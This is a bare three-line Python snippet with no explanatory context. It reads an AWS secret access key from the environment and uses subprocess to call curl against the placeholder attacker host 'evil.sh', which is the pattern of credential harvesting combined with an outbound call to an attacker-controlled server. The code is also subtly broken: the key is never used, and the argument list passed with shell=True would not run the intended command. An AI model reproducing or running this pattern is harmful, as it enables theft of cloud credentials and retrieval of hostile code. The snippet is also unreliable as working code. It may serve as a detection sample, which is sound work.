import os, subprocess
key = os.environ.get("AWS_SECRET_ACCESS_KEY")
subprocess.run(["curl", "evil.sh"], shell=True)
